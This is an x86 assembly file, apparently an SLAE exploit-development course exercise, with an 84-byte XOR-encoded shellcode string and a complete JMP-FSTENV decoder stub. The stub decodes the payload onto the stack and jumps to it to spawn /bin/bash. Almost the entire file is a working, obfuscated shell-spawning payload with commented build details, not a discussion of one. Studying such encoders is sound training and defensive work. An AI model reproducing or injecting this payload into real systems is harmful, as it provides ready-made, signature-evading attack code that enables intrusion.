;Description: 	JMP-FSTENV XOR encoded STSB (shellcode to spawn bash :D) (84 bytes)
;Shellcode:	\xd9\xee\xeb\x20\x54\xef\x29\x64\xb4\xb7\x6d\x05\xcb\xcb\x6d\x07\xcb\x8c\xcb\xcb\x8c\x86\x8d\x8a\x86\x85\x97\x8c\xb4\x6d\x06\x8c\x11\x11\xd5\x24\x9b\xd9\x74\x24\xf4\x5e\x8d\x76\x04\x31\xc9\xb1\x08\x31\xc0\x8a\x06\x34\xe4\x46\x8a\x26\x80\xf4\xe4\x46\xc1\xc0\x10\x8a\x06\x34\xe4\x46\x8a\x26\x80\xf4\xe4\xc1\xc0\x10\x50\x46\xe2\xdf\xff\xe4
;Author: 	Paolo Stivanin <https://github.com/polslinux>
;SLAE ID: 	526 

;The encoded shellcode will spawn /bin/bash

global _start
section .text
_start:
	fldz
	jmp short do_me
Shellcode: db 0x54,0xef,0x29,0x64,0xb4,0xb7,0x6d,0x05,0xcb,0xcb,0x6d,0x07,0xcb,0x8c,0xcb,0xcb,0x8c,0x86,0x8d,0x8a,0x86,0x85,0x97,0x8c,0xb4,0x6d,0x06,0x8c,0x11,0x11,0xd5,0x24
do_me:  fstenv [esp-0xc]
	pop esi			;esi contains address of fldz
	lea esi,[esi+4]		;and now esi contains address of Shellcode
	xor ecx,ecx
	mov cl,8		;read 4 byte at time so 8 cycle are needed
main:	xor eax,eax
	mov byte al,[esi]	;mov first byte inside al
	xor byte al,0xe4	;xor the first byte
	inc esi			;increment esi (next byte)
	mov byte ah,[esi]	;mov second byte inside ah
	xor byte ah,0xe4
	inc esi			;next byte
	rol eax,16		;rotate left 16 bit (eax-ah-al become ah-al-eax that is equal to (ah-al)-ah(eax)-al(eax)...
	mov byte al,[esi]	;...so i can repeat the move byte...
	xor byte al,0xe4
	inc esi
	mov byte ah,[esi]
	xor byte ah,0xe4
	rol eax,16		;...and then restoring the original structure :)
	push eax
	inc esi
	loop main
	jmp esp			;jmp to stack to execute the shellcode ;)
